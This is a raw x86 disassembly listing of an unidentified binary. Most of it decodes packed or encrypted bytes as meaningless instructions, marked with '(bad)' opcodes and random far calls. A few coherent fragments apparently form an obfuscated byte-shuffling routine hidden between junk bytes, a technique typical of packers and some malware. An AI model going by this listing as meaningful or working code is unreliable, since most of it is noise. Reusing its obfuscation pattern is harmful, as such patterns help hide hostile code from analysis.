  412cf6:	adc    eax,0x1dd93267
  412cfb:	inc    esp
  412cfc:	repz (bad) 
  412cfe:	dec    edx
  412cff:	ds pop ds
  412d01:	adc    BYTE PTR [edx],al
  412d03:	retf   
  412d04:	fwait
  412d05:	sub    BYTE PTR [edi],cl
  412d07:	xchg   ecx,eax
  412d08:	mov    bl,0xb
  412d0a:	sub    esi,edi
  412d0c:	es mov esi,0x1cc1389e
  412d12:	das    
  412d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d14:	and    al,0x29
  412d16:	xchg   BYTE PTR [eax+0x62c1f6db],bh
  412d1c:	or     ch,dh
  412d1e:	mov    ds:0x5ae9d910,al
  412d23:	sbb    DWORD PTR [edi],eax
  412d25:	sub    cl,dh
  412d27:	sub    ch,BYTE PTR [ecx+0x72ce8fa6]
  412d2d:	xchg   ebx,eax
  412d2e:	mov    ds:0x92950f48,al
  412d33:	in     al,0x79
  412d35:	enter  0xfefe,0xbb
  412d39:	sub    DWORD PTR [ebx-0x6d],0x38
  412d3d:	cmp    DWORD PTR [edx-0x6],edx
  412d40:	(bad)  
  412d42:	inc    ebx
  412d43:	imul   eax,eax,0xb782100d
  412d49:	sti    
  412d4a:	xor    ah,BYTE PTR [edx]
  412d4c:	push   esp
  412d4d:	fisttp WORD PTR [ebp-0x2e]
  412d50:	and    al,0x40
  412d52:	mov    edi,esp
  412d54:	adc    edi,edx
  412d56:	repnz or BYTE PTR [esi-0x413cfa51],al
  412d5d:	data16 or al,0xf7
  412d60:	imul   ebx,DWORD PTR [edi-0x51b48682],0x3c65799d
  412d6a:	lods   eax,DWORD PTR ds:[esi]
  412d6b:	jo     0x412d6c
  412d6d:	mov    bh,0x1c
  412d6f:	fsubrp st(2),st
  412d71:	xchg   esp,eax
  412d72:	push   ss
  412d73:	push   esp
  412d74:	mov    ebx,0x3d3a3ae4
  412d79:	sbb    esi,edx
  412d7b:	mov    ebp,0xbb140403
  412d80:	push   ds
  412d81:	dec    ebx
  412d82:	stos   BYTE PTR es:[edi],al
  412d83:	fadd   DWORD PTR [edx]
  412d85:	cmp    al,0x20
  412d87:	or     al,BYTE PTR [ebx]
  412d89:	xlat   BYTE PTR ds:[ebx]
  412d8a:	cdq    
  412d8b:	icebp  
  412d8c:	cdq    
  412d8d:	sbb    DWORD PTR [eax-0x79f140b7],0xa4dcf32b
  412d97:	mov    edi,0xeb5069eb
  412d9c:	lods   eax,DWORD PTR ds:[esi]
  412d9d:	and    ch,0xce
  412da0:	jno    0x412da8
  412da2:	imul   ecx,DWORD PTR [esi-0x59],0xffffff98
  412da6:	sub    al,0x2f
  412da8:	and    BYTE PTR [ebp+0x63ed9d86],bh
  412dae:	repnz rol DWORD PTR [edi],cl
  412db1:	mov    DWORD PTR [edi+0x4b3df41b],esp
  412db7:	repz cmp edx,DWORD PTR [esi-0x53b067a]
  412dbe:	mov    cl,0x7f
  412dc0:	icebp  
  412dc1:	inc    eax
  412dc2:	adc    ecx,eax
  412dc4:	pusha  
  412dc5:	in     eax,dx
  412dc6:	clc    
  412dc7:	aam    0x1c
  412dc9:	mov    BYTE PTR [ecx+0x48c7514],dl
  412dcf:	jecxz  0x412ded
  412dd1:	add    BYTE PTR [eax+0x1506b541],bl
  412dd7:	xchg   edx,eax
  412dd8:	push   esp
  412dd9:	push   esp
  412dda:	daa    
  412ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ddc:	push   eax
  412ddd:	fadd   QWORD PTR [ebx+0x109d32d1]
  412de3:	data16 stos BYTE PTR es:[edi],al
  412de5:	mov    edx,0x99181f7a
  412dea:	jns    0x412e3a
  412dec:	xchg   ebx,eax
  412ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dee:	push   0x32fdb3fb
  412df3:	std    
  412df4:	xor    al,0xa0
  412df6:	xchg   edx,eax
  412df7:	sar    BYTE PTR [eax+eax*2-0x75],0xd9
  412dfc:	adc    eax,0xb7be4f85
  412e01:	mov    bh,0x73
  412e03:	retf   
  412e04:	scas   eax,DWORD PTR es:[edi]
  412e05:	(bad)  
  412e06:	adc    cl,BYTE PTR [edi]
  412e08:	ret    0x9b56
  412e0b:	inc    eax
  412e0c:	xchg   ecx,ebp
  412e0e:	into   
  412e0f:	mov    bh,0x6f
  412e11:	dec    BYTE PTR [eax+0x7cd66836]
  412e17:	jnp    0x412de1
  412e19:	out    0x65,al
  412e1b:	outs   dx,DWORD PTR ds:[esi]
  412e1c:	lock xchg edi,eax
  412e1e:	bound  esp,QWORD PTR [eax-0x7fe2a7e7]
  412e24:	mov    dh,0x8e
  412e26:	cmc    
  412e27:	jg     0x412e09
  412e29:	(bad)  
  412e2a:	mov    ebp,0xbf140db5
  412e2f:	(bad)  
  412e30:	push   ds
  412e31:	ficomp DWORD PTR [edx-0x5b]
  412e34:	ins    BYTE PTR es:[edi],dx
  412e35:	(bad)  
  412e36:	push   cs
  412e37:	adc    ecx,edx
  412e39:	push   es
  412e3a:	adc    eax,0x2436f486
  412e3f:	in     al,0x7c
  412e41:	or     eax,0x4c3bc173
  412e46:	(bad)  
  412e47:	aaa    
  412e48:	mov    BYTE PTR [esi],bh
  412e4a:	inc    edx
  412e4b:	pop    ds
  412e4c:	(bad)  
  412e4e:	sub    ah,dl
  412e50:	inc    ecx
  412e51:	add    eax,0xb0008f68
  412e56:	sub    BYTE PTR [eax+edx*4+0x6af241c3],dh
  412e5d:	ins    BYTE PTR es:[edi],dx
  412e5e:	mov    ebx,DWORD PTR [esi-0x2f71c167]
  412e64:	xchg   ebx,eax
  412e65:	jl     0x412ee6
  412e67:	adc    DWORD PTR [edx],ecx
  412e69:	sub    esp,DWORD PTR [ecx+0x122cf207]
  412e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e70:	imul   edi,DWORD PTR [edi],0xdc966df8
  412e76:	inc    edi
  412e77:	xor    eax,0x7c937125
  412e7c:	jmp    0x412e16
  412e7e:	idiv   DWORD PTR [ecx+0x58713b99]
  412e84:	daa    
  412e85:	mov    eax,ds:0x46c8ad58
  412e8a:	mov    dl,0xb5
  412e8c:	push   ecx
  412e8d:	call   0x811:0xc9b9e1c1
  412e94:	enter  0xbfba,0xe2
  412e98:	inc    edi
  412e99:	inc    ecx
  412e9a:	push   cs
  412e9b:	nop
  412e9c:	pop    ebp
  412e9d:	cdq    
  412e9e:	dec    esp
  412e9f:	sahf   
  412ea0:	jmp    0x412f00
  412ea2:	or     DWORD PTR [eax+0x3a],edi
  412ea5:	lea    esp,[eax]
  412ea7:	sti    
  412ea8:	xor    ecx,eax
  412eaa:	call   0xf41a46d
  412eaf:	repz lock js 0x412f0a
  412eb3:	jbe    0x412f32
  412eb5:	(bad)  
  412eb6:	cld    
  412eb7:	sbb    eax,0x8fcce6fd
  412ebc:	or     ebx,edx
  412ebe:	sahf   
  412ebf:	inc    ebx
  412ec0:	push   cs
  412ec1:	push   ebx
  412ec2:	enter  0x8e58,0x58
  412ec6:	aas    
  412ec7:	and    DWORD PTR [ebp+esi*8+0x71],ebp
  412ecb:	inc    ebx
  412ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ecd:	test   BYTE PTR ds:[ecx],ah
  412ed0:	aaa    
  412ed1:	xor    eax,0xa0f0453f
  412ed6:	adc    DWORD PTR [edx+0x59],eax
  412ed9:	cli    
  412eda:	jno    0x412f3c
  412edc:	in     eax,dx
  412edd:	sbb    eax,0x7f005b84
  412ee2:	rcr    DWORD PTR [edx-0x342a16dd],0xb9
  412ee9:	inc    esi
  412eea:	ficom  DWORD PTR [eax-0x4]
  412eed:	mov    esp,0x3b808831
  412ef2:	xor    esi,DWORD PTR [edi+0x65c971be]
  412ef8:	add    cl,BYTE PTR [eax+0x558b0f55]
  412efe:	hlt    
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x0
  412f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f27:	jecxz  0x412ed9
  412f29:	imul   esi,DWORD PTR [ebp+0x78],0x787ee578
  412f30:	js     0x412fa7
  412f32:	inc    ecx
  412f33:	test   eax,0x7ddc43bb
  412f39:	add    ch,dl
  412f3b:	jbe    0x412eff
  412f3d:	inc    ecx
  412f3e:	xchg   esi,eax
  412f3f:	inc    ebx
  412f40:	xchg   esp,eax
  412f41:	dec    ebp
  412f42:	adc    esp,DWORD PTR [ebx+0x7a]
  412f45:	cmp    dh,BYTE PTR [ecx+0x2395996e]
  412f4b:	push   esp
  412f4c:	inc    esp
  412f4d:	ret    0x1387
  412f50:	enter  0x2e88,0x89
  412f54:	dec    edx
  412f55:	imul   edx,ecx
  412f58:	jecxz  0x412fd6
  412f5a:	and    ebp,0xfffffffc
  412f5d:	pop    es
  412f5e:	xor    BYTE PTR [esi+0x7d3443ae],ch
  412f64:	sub    eax,esp
  412f66:	std    
  412f67:	pcmpgtd mm7,QWORD PTR [edi-0x283e4eaa]
  412f6e:	mov    esp,edi
  412f70:	xchg   edx,eax
  412f71:	(bad)  
  412f72:	mov    al,ds:0x566a06d0
  412f77:	icebp  
  412f78:	or     al,0x36
  412f7a:	xchg   BYTE PTR [esi-0x2f7dc6f2],cl
  412f80:	pusha  
  412f81:	sub    BYTE PTR ds:0x3ac23b8d,ah
  412f87:	push   ds
  412f88:	jmp    0xc5cda27d
  412f8d:	mov    WORD PTR [esi-0x1c7ba5a6],gs
  412f93:	lods   eax,DWORD PTR ds:[esi]
  412f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f95:	repz xor BYTE PTR [ebx],0xcf
  412f99:	les    ebx,FWORD PTR [esi]
  412f9b:	mov    esi,0xb301b113
  412fa0:	jnp    0x412f8f
  412fa2:	into   
  412fa3:	imul   eax,esp,0x59c50a03
  412fa9:	xchg   esp,eax
  412faa:	fisub  DWORD PTR [edi+edi*1-0x4d]
  412fae:	mov    ebx,0x93805686
  412fb3:	mov    ds:0x187a6ef8,eax
  412fb8:	iret   
  412fb9:	adc    dh,BYTE PTR [ebp-0x56954cf0]
  412fbf:	cmp    DWORD PTR [edx],eax
  412fc1:	jmp    0x4f38b40a
  412fc6:	sbb    BYTE PTR [esp+edx*1],cl
  412fc9:	sahf   
  412fca:	shr    dl,1
  412fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fcd:	add    ebx,DWORD PTR [ecx+0x1e0dc294]
  412fd3:	mov    ah,0xa
  412fd5:	mov    eax,0xc851557f
  412fda:	pop    ebp
  412fdb:	pop    ebp
  412fdc:	ins    BYTE PTR es:[edi],dx
  412fdd:	mov    ebp,0xb4ea6878
  412fe2:	push   ecx
  412fe3:	ror    BYTE PTR [esi+ebx*1],cl
  412fe6:	cmp    BYTE PTR [ebx],0xaa
  412fe9:	ja     0x413045
  412feb:	sub    al,0xe6
  412fed:	jge    0x412fd3
  412fef:	xor    eax,0x963cc50f
  412ff4:	and    al,0xc9
  412ff6:	leave  
  412ff7:	mov    ah,0x16
  412ff9:	or     eax,0x9ed4edf2
  412ffe:	test   eax,0xa2e712e7
  413003:	fnstsw WORD PTR [ecx+eax*1+0x44]
  413007:	xchg   DWORD PTR [ebp+0x61b7a60f],esp
  41300d:	mov    al,BYTE PTR [ebx+0xfe717f]
  413013:	pop    esi
  413014:	enter  0x3d71,0x53
  413018:	into   
  413019:	xchg   esi,eax
  41301a:	push   ebp
  41301b:	je     0x412fd5
  41301d:	lods   al,BYTE PTR ds:[esi]
  41301e:	mov    esi,0x621a4f87
  413023:	push   ecx
  413024:	mov    esi,0x3137c8c5
  413029:	(bad)
  41302c:	push   ecx
  41302d:	dec    edi
  41302e:	aad    0xaa
  413030:	pushf  
  413031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413032:	xor    DWORD PTR [ecx-0x72da6182],ecx
  413038:	idiv   BYTE PTR [ebx-0x59]
  41303b:	cmp    ebx,DWORD PTR [eax+0x40]
  41303e:	add    esi,edx
  413040:	out    0x3c,eax
  413042:	add    dh,cl
  413044:	aaa    
  413045:	pop    edx
  413046:	jnp    0x412ff2
  413048:	bound  esi,QWORD PTR [ecx+ebp*1-0x2d]
  41304c:	stc    
  41304d:	mov    ebx,0xb9f9da51
  413052:	jb     0x4130a2
  413054:	pop    ds
  413055:	xchg   ebp,eax
  413056:	or     DWORD PTR [edx+ebx*8],esi
  413059:	and    DWORD PTR [ebx-0x7a3d8cb],esp
  41305f:	mov    esp,0x6ee07236
  413064:	retf   0x4d6c
  413067:	call   0xfa81:0xa528aa91
  41306e:	mov    bl,0x38
  413070:	dec    esi
  413071:	or     esi,DWORD PTR [ebx+0x2594c60a]
  413077:	pop    ds
  413078:	push   esp
  413079:	pop    ecx
  41307a:	pop    ds
  41307b:	xlat   BYTE PTR ds:[ebx]
  41307c:	hlt    
  41307d:	add    eax,0xe43a8aa7
  413082:	and    eax,0x9e9c7f26
  413087:	scas   al,BYTE PTR es:[edi]
  413088:	iret   
  413089:	and    ebx,ebx
  41308b:	push   es
  41308c:	mov    edx,0x176198b3
  413091:	inc    ebp
  413092:	mov    al,ds:0x8d569af3
  413097:	and    cl,BYTE PTR [edi]
  413099:	mov    ?,edi
  41309b:	jnp    0x413084
  41309d:	mov    es,WORD PTR [ebx-0x1d9a2976]
  4130a3:	adc    BYTE PTR cs:[ebx-0xd],bl
  4130a7:	int3   
  4130a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130a9:	(bad)  
  4130aa:	fnsave [edi]
  4130ac:	sub    BYTE PTR [ebp-0x5e],al
  4130af:	(bad)  
  4130b1:	cli    
  4130b2:	mov    ss,WORD PTR [eax-0x68]
  4130b5:	xor    ebx,ebp
  4130b7:	sub    al,0x47
  4130b9:	sub    eax,0x649f12d3
  4130be:	clc    
  4130bf:	stos   BYTE PTR es:[edi],al
  4130c0:	gs xchg ebx,eax
  4130c2:	(bad)  
  4130c3:	fsubr  QWORD PTR [eax]
  4130c5:	(bad)  
  4130c6:	stc    
  4130c7:	or     DWORD PTR [eax-0x7c5a06bc],ecx
  4130cd:	mov    ah,ah
  4130cf:	aaa    
  4130d0:	or     esp,ebp
  4130d2:	adc    cl,bl
  4130d4:	scas   eax,DWORD PTR es:[edi]
  4130d5:	(bad)  
  4130d6:	mov    edx,0xca394f49
  4130db:	in     al,dx
  4130dc:	cmp    dl,bh
  4130de:	cs mov cl,0x7f
  4130e1:	xchg   edx,eax
  4130e2:	and    eax,0xa7f35148
  4130e7:	popf   
  4130e8:	repnz mov bl,0xa7
  4130eb:	add    bh,ah
  4130ed:	add    DWORD PTR [edx+eax*4+0x3d],0x31af4b0f
  4130f5:	sub    DWORD PTR [edx],ebp
  4130f7:	scas   eax,DWORD PTR es:[edi]
  4130f8:	sahf   
  4130f9:	inc    esp
  4130fa:	jmp    0x413146
  4130fc:	out    dx,eax
  4130fd:	or     esi,DWORD PTR [ebx]
  4130ff:	cmp    BYTE PTR [ebx-0x48900d5b],ch
  413105:	dec    ebp
  413106:	mul    BYTE PTR [edx-0xd43cc12]
  41310c:	mov    ebp,0x58cd9b46
  413111:	test   DWORD PTR [ebx+eiz*8+0x17],eax
  413115:	shr    eax,0xe
  413118:	push   edi
  413119:	adc    ebp,esi
  41311b:	cmp    dh,BYTE PTR [ecx]
  41311d:	not    DWORD PTR [ecx-0x14]
  413120:	test   BYTE PTR [esi-0x5baa0f9e],dl
  413126:	push   es
  413127:	lock inc esp
  413129:	mov    ds:0x7aac3027,al
  41312e:	add    ah,ah
  413130:	add    cl,BYTE PTR [esi]
  413132:	test   ebp,esp
  413134:	repnz xchg ebx,eax
  413136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413137:	pushf  
  413138:	jg     0x4130dd
  41313a:	pop    ebp
  41313b:	outs   dx,BYTE PTR ds:[esi]
  41313c:	jge    0x413190
  41313e:	jge    0x41316c
  413140:	xor    edx,esp
  413142:	repz lahf 
  413144:	std    
  413145:	mov    ecx,DWORD PTR [edi-0x7f]
  413148:	xchg   esp,eax
  413149:	pop    edi
  41314a:	inc    edi
  41314b:	cmp    esi,DWORD PTR [ebx+0x384e0e3]
  413151:	mov    dl,0x8e
  413153:	rcl    BYTE PTR [eax],1
  413155:	clc    
  413156:	xchg   edi,eax
  413157:	push   edi
  413158:	add    DWORD PTR [esi],0x95e1c3e
  41315e:	sbb    ecx,DWORD PTR [edx-0x4f1f8781]
  413164:	pusha  
  413165:	and    ebp,ebp
  413167:	xchg   ebx,eax
  413168:	sbb    eax,0xb9213f65
  41316d:	or     ebx,esi
  41316f:	aas    
  413170:	push   ebx
  413171:	xor    DWORD PTR [esi],edi
  413173:	pop    edx
  413174:	pop    edx
  413175:	loop   0x4131f2
  413177:	dec    edx
  413178:	cmp    eax,0xf6a8b91a
  41317d:	mov    al,ds:0xec999add
  413182:	mov    al,0x14
  413184:	push   ebp
  413185:	mov    eax,ds:0xd3bc6a74
  41318a:	mov    edi,0x91f9b725
  41318f:	(bad)  
  413190:	test   al,0xba
  413192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413193:	lea    ebp,[edi-0x7b5d6c96]
  413199:	pushf  
  41319a:	xchg   ecx,eax
  41319b:	stos   DWORD PTR es:[edi],eax
  41319c:	mov    edi,DWORD PTR [ebp-0xc]
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	xchg   BYTE PTR [ecx],ch
  4131c9:	cdq    
  4131ca:	lock (bad) 
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x41323a
  4131d4:	je     0x413170
  4131d6:	std    
  4131d7:	and    BYTE PTR [ebp-0x12bd7f15],0xc7
  4131de:	sti    
  4131df:	ficomp DWORD PTR [ecx+0x2f]
  4131e2:	pop    esi
  4131e3:	xchg   BYTE PTR [edi+0x2a6e9f1c],dl
  4131e9:	loop   0x4131ac
  4131eb:	scas   eax,DWORD PTR es:[edi]
  4131ec:	xor    BYTE PTR [esi+0x78],dh
  4131ef:	lahf   
  4131f0:	push   cs
  4131f1:	fbld   TBYTE PTR [bp+0x15ad]
  4131f6:	push   cs
  4131f7:	mov    ecx,0xf6bab244
  4131fc:	(bad)  [esp+eax*4-0x64]
  413200:	xor    eax,0x6c6edaa1
  413205:	or     BYTE PTR [ebx-0x4f39dd4e],bl
  41320b:	pusha  
  41320c:	inc    edx
  41320d:	push   esp
  41320e:	pop    esi
  41320f:	pop    esi
  413210:	sbb    eax,0xc99cd682
  413215:	and    ebp,0x89dd0003
  41321b:	adc    edi,DWORD PTR [ebx]
  41321d:	cmp    ecx,DWORD PTR [ecx+0x0]
  413220:	bound  ebx,QWORD PTR [ebx-0x10335708]
  413226:	xchg   ebx,eax
  413227:	cmc    
  413228:	mov    ebp,0x87eb0d34
  41322d:	into   
  41322e:	out    dx,eax
  41322f:	ins    BYTE PTR es:[edi],dx
  413230:	lds    esi,FWORD PTR [ebp-0x6d]
  413233:	test   al,0xd1
  413235:	push   ss
  413236:	and    ah,BYTE PTR [edi+ecx*1]
  413239:	(bad)  
  41323a:	repnz mov WORD PTR [ebp+0x7],?
  41323e:	ins    BYTE PTR es:[edi],dx
  41323f:	inc    edx
  413240:	leave  
  413241:	ret    0x320b
  413244:	(bad)  
  413245:	stos   DWORD PTR es:[edi],eax
  413246:	(bad)  
  413247:	loope  0x4132c4
  413249:	push   es
  41324a:	mov    al,0xb1
  41324c:	pop    es
  41324d:	dec    eax
  41324e:	push   ss
  41324f:	mov    ebp,0x225f12c4
  413254:	xor    al,0x36
  413256:	out    0x9,eax
  413258:	call   FWORD PTR [edi]
  41325a:	jle    0x4131e1
  41325c:	xor    DWORD PTR [edi+0x3da18ae3],esp
  413262:	fwait
  413263:	pop    esi
  413264:	push   edx
  413265:	sbb    DWORD PTR ds:0xc7823645,ebx
  41326b:	add    dl,BYTE PTR [ebx]
  41326d:	ret    
  41326e:	jl     0x41325f
  413270:	xor    al,BYTE PTR [ecx+edi*4-0x79]
  413274:	retf   
  413275:	test   BYTE PTR [ebx+edi*2+0x39fef9ab],cl
  41327c:	dec    edx
  41327d:	adc    bh,BYTE PTR [eax+0x7c]
  413280:	or     DWORD PTR [ecx],edx
  413282:	push   es
  413283:	dec    ecx
  413284:	imul   esi,DWORD PTR [edx-0x1c489a21],0x53f2923f
  41328e:	icebp  
  41328f:	push   esi
  413290:	js     0x413233
  413292:	fwait
  413293:	daa    
  413294:	fs pop edx
  413296:	(bad)  
  413297:	ds and eax,0x427c3106
  41329d:	jo     0x4132b1
  41329f:	scas   al,BYTE PTR es:[edi]
  4132a0:	retf   0xf009
  4132a3:	sar    DWORD PTR [eax-0x7d],0x7
  4132a7:	into   
  4132a8:	addr16 xor al,0x36
  4132ab:	xchg   edi,eax
  4132ac:	popa   
  4132ad:	cs (bad) 
  4132af:	xchg   esi,eax
  4132b0:	adc    edi,0x69
  4132b3:	shl    DWORD PTR [ebx-0x318ea988],0x47
  4132ba:	pop    edi
  4132bb:	and    DWORD PTR [ecx],ebp
  4132bd:	push   edx
  4132be:	mov    ebp,0x1de1f4d0
  4132c3:	(bad)  
  4132c4:	neg    bh
  4132c6:	mov    eax,edx
  4132c8:	fs mov ebp,0xe9b11f35
  4132ce:	mov    ecx,0x2928d01f
  4132d3:	mov    edi,0x78b7fcba
  4132d8:	in     al,dx
  4132d9:	push   0x47a4838d
  4132de:	dec    ecx
  4132df:	sbb    bl,cl
  4132e1:	std    
  4132e2:	cmp    al,0x8
  4132e4:	jno    0x41327c
  4132e6:	std    
  4132e7:	push   es
  4132e8:	mov    esi,0xffbd1cc9
  4132ed:	push   0x36
  4132ef:	and    BYTE PTR [edi+0x36],ch
  4132f2:	test   eax,0xf563fbdc
  4132f7:	cmp    al,0x82
  4132f9:	mov    dh,0x6
  4132fb:	fld    TBYTE PTR [eax-0x63f52338]
  413301:	(bad)  
  413302:	fs ret 0x6ce2
  413306:	leave  
  413307:	leave  
  413308:	mov    WORD PTR [edx+0x49],ss
  41330b:	popa   
  41330c:	inc    ebx
  41330d:	fnstcw WORD PTR [ebp+eiz*8+0x28fc5c3f]
  413314:	mov    ah,0x35
  413316:	mov    cl,0xaf
  413318:	gs dec edx
  41331a:	dec    ebp
  41331b:	popf   
  41331c:	jge    0x4132f4
  41331e:	pop    ecx
  41331f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413320:	ds jb  0x413392
  413323:	je     0x4132c8
  413325:	jmp    0x41331e
  413327:	mov    ebp,0xc013e555
  41332c:	enter  0x1c7a,0x34
  413330:	jp     0x413396
  413332:	bnd jg 0x4132d1
  413335:	sbb    al,dl
  413337:	add    al,0xdb
  41333a:	stos   BYTE PTR es:[edi],al
  41333b:	out    0xcc,al
  41333d:	enter  0x136,0x8
  413341:	out    0xe9,eax
  413343:	inc    edx
  413344:	xchg   ebp,eax
  413345:	adc    eax,0x9f64b2d6
  41334a:	aam    0x2c
  41334c:	xor    BYTE PTR [ecx-0x5fc2c94d],0x78
  413353:	cmp    BYTE PTR [eax-0xb],al
  413356:	jno    0x4133bf
  413358:	adc    eax,0xc788c2a7
  41335d:	call   0xf643d16c
  413362:	or     DWORD PTR [eax-0x67cb81f],esp
  413368:	dec    ebp
  413369:	mov    esi,0x6fe4009d
  41336e:	retf   0xcbb7
  413371:	or     cl,BYTE PTR [ebp+0x6]
  413374:	test   DWORD PTR [eax],ebp
  413376:	sbb    DWORD PTR [edi+0x36f6a042],eax
  41337c:	adc    bh,bl
  41337e:	adc    al,0x60
  413380:	cmp    edx,DWORD PTR [eax+eax*4+0x53]
  413384:	sbb    eax,0x4e2b8339
  413389:	push   ebp
  41338a:	inc    edi
  41338b:	xchg   ebp,eax
  41338c:	jae    0x41339e
  41338e:	arpl   WORD PTR [edx-0x78],di
  413391:	mov    ds:0xa29d3a3e,al
  413396:	stc    
  413397:	add    eax,0x83175cdb
  41339c:	dec    edx
  41339d:	push   esp
  41339e:	outs   dx,DWORD PTR ds:[esi]
  41339f:	push   ebp
  4133a0:	jl     0x4133d9
  4133a2:	aad    0x6a
  4133a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a6:	mov    edi,fs
  4133a8:	in     eax,dx
  4133a9:	add    dl,BYTE PTR [edx+0x4f]
  4133ac:	pop    edi
  4133ad:	sub    edi,DWORD PTR [eax-0x6567c731]
  4133b3:	fadd   DWORD PTR [eax-0x48]
  4133b6:	cli    
  4133b7:	pop    es
  4133b8:	and    eax,DWORD PTR [esi-0x3d78aade]
  4133be:	inc    ebx
  4133bf:	cmp    eax,0xda89a5dd
  4133c4:	sub    bl,ah
  4133c6:	dec    ebx
  4133c7:	retf   
  4133c8:	(bad)  
  4133c9:	xor    al,0xa9
  4133cb:	(bad)  
  4133cd:	lods   eax,DWORD PTR ds:[esi]
  4133ce:	inc    edx
  4133cf:	jne    0x4133ec
  4133d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133d2:	icebp  
  4133d3:	dec    eax
  4133d4:	sub    ebx,0xfaf0ab8d
  4133da:	add    BYTE PTR [edx],bl
  4133dc:	rol    edi,cl
  4133de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133df:	push   es
  4133e0:	ja     0x4133f5
  4133e2:	jnp    0x413445
  4133e4:	or     ebx,esp
  4133e6:	jae    0x413436
  4133e8:	xor    al,0xce
  4133ea:	adc    esi,0xffffffa8
  4133ed:	mov    DWORD PTR [edx+0x1a4a2486],ebp
  4133f3:	mov    ch,0x49
  4133f5:	push   ds
  4133f6:	fisubr DWORD PTR [eax+0xca4f979]
  4133fc:	shl    DWORD PTR [ebp+0x7e1622f7],0x5d
  413403:	add    al,0x5f
  413405:	lock out dx,eax
  413407:	ins    DWORD PTR es:[edi],dx
  413408:	bound  esp,QWORD PTR [eax-0x6c]
  41340b:	call   0x42db:0x20d3c265
  413412:	out    0x66,eax
  413414:	repz push ecx
  413416:	lock loopne 0x41339b
  413419:	stos   BYTE PTR es:[edi],al
  41341a:	xchg   DWORD PTR [ebp-0x4e7cbda3],eax
  413420:	lock mov edx,0x840a11ad
  413426:	jl     0x41340a
  413428:	dec    ecx
  413429:	xchg   ebp,eax
  41342a:	sub    eax,0x20f2638f
  41342f:	mov    bh,al
  413431:	sbb    DWORD PTR [edx*4-0x3c2c815d],esp
  413438:	out    dx,eax
  413439:	push   es
  41343a:	sbb    eax,0x37053d2
  41343f:	jge    0x41342d
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0xf5f4065e
  41345f:	in     eax,0x43
  413461:	js     0x4134e2
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x41344a
  413469:	lods   al,BYTE PTR ds:[esi]
  41346a:	push   esp
  41346b:	loope  0x41341a
  41346d:	popf   
  41346e:	leave  
  41346f:	sbb    ebx,ecx
  413471:	jecxz  0x4134ee
  413473:	dec    esi
  413474:	imul   ebx,DWORD PTR [ebp-0x16],0xffffffb3
  413478:	or     bl,bh
  41347a:	sbb    BYTE PTR [ebx+0x44],0x8f
  41347e:	add    BYTE PTR [esi],bl
  413480:	pushf  
  413481:	jnp    0x413467
  413483:	push   eax
  413484:	scas   al,BYTE PTR es:[edi]
  413485:	test   BYTE PTR [ebp+0x41],al
  413488:	pop    ebp
  413489:	neg    BYTE PTR [edx+ebp*1-0x79]
  41348d:	in     al,0x7f
  41348f:	ja     0x4134ee
  413491:	inc    esi
  413492:	outs   dx,DWORD PTR ds:[esi]
  413493:	jne    0x41346b
  413495:	mov    cl,0x79
  413497:	inc    esp
  413498:	popf   
  413499:	cmp    ebx,DWORD PTR [ecx]
  41349b:	aaa    
  41349c:	outs   dx,BYTE PTR ds:[esi]
  41349d:	mov    cl,0xcb
  41349f:	daa    
  4134a0:	inc    ebp
  4134a1:	adc    eax,0xa338dbc3
  4134a6:	add    eax,0x482e8167
  4134ab:	out    0x3f,eax
  4134ad:	out    0xe6,al
  4134af:	xchg   edi,eax
  4134b0:	push   edx
  4134b1:	leave  
  4134b2:	push   eax
  4134b3:	xor    BYTE PTR [ebx+0x7b3c8fcd],0x39
  4134ba:	imul   ebp,esi,0x7a
  4134bd:	(bad)  
  4134be:	scas   eax,DWORD PTR es:[edi]
  4134bf:	je     0x4134ab
  4134c1:	arpl   WORD PTR [ecx+0x42e8ec51],sp
  4134c7:	retf   
  4134c8:	sbb    dh,al
  4134ca:	cwde   
  4134cb:	loopne 0x413549
  4134cd:	push   edx
  4134ce:	push   esi
